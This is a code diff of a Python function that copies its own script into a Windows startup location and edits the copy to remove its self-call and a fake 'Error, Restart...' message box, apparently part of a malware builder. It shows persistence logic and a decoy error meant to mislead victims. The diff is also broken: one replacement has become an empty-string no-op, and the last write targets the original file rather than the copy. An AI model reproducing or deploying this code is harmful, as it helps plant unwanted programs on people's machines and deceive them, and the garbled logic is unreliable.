@@ -49,16 +49,19 @@ def add_to_startup(py_file_path=file_path, bat_file_path=None):
     bat_file_path = os.path.join(bat_file_path, bat_file_name)
     shutil.copy2(file_path, bat_file_path)
 
-    # Replace add_to_startup() with an empty string in the copied file
+    # Replace  with an empty string in the copied file
     with open(bat_file_path, "r", encoding="utf-8") as f:
         contents = f.read()
-    contents = contents.replace("add_to_startup()", "")
+    contents = contents.replace("", "")
     with open(bat_file_path, "w", encoding="utf-8") as f:
         f.write(contents)
-    contents = contents.replace("ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)", "pass")
 
-    with open(bat_file_path, "w", encoding="utf-8") as f:
+    contents = contents.replace('if fakeerror == True:\n    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)\nelse:pass', 'pass')
+
+# Write the updated contents back to the file
+    with open(file_path, "w", encoding="utf-8") as f:
         f.write(contents)
+
 
 add_to_startup()
 
